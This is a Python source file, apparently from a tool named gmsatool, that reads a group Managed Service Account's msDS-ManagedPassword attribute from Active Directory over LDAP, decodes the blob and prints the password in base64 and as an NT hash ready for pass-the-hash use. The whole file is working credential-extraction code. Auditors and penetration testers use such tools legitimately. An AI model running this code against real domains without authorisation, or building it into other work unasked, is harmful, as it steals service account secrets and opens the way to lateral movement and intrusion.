from base64 import b64encode

# from ldap3.protocol.microsoft import security_descriptor_control
# from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
from Cryptodome.Hash import MD4
from rich import print
from rich.panel import Panel

from gmsatool.protocols.ldap import get_entry
from gmsatool.helpers.structure import Structure
from gmsatool.helpers.common import logger, bcolors


class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ("Version", "<H"),
        ("Reserved", "<H"),
        ("Length", "<L"),
        ("CurrentPasswordOffset", "<H"),
        ("PreviousPasswordOffset", "<H"),
        ("QueryPasswordIntervalOffset", "<H"),
        ("UnchangedPasswordIntervalOffset", "<H"),
        ("CurrentPassword", "u"),
        ("PreviousPassword", "u"),
        # ('AlignmentPadding',':'),
        ("QueryPasswordInterval", "<Q"),
        # ("UnchangedPasswordInterval", "<Q"),
    )

    def calc_nthash(self):
        return MD4.new(self["CurrentPassword"]).hexdigest()

    def calc_base64(self):
        return b64encode(self["CurrentPassword"]).decode()


class GMSAReader:
    def __init__(self, domain, target, ldap_session):
        self.domain = domain
        self.dn = ",".join([f"dc={i}" for i in self.domain.split(".")])
        self.target = target
        self.ldap_session = ldap_session

    def read_gmsa_password(self):
        filter = f"(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName={self.target}))"
        result = get_entry(self.ldap_session, self.dn, search_filter=filter, attributes=["msDS-ManagedPassword"])

        data = result[0]["attributes"]["msDS-ManagedPassword"]

        if data:
            blob = MSDS_MANAGEDPASSWORD_BLOB(data)
            logger.info(f"{bcolors.OKGREEN}{bcolors.BOLD}\n[+] msDS-ManagedPassword obtained for {self.target}{bcolors.ENDC}")
            print(Panel(blob.calc_base64(), title="Base64 encoded gMSA password", title_align="left"))
            print(Panel(blob.calc_nthash(), title="gMSA password NThash", title_align="left"))
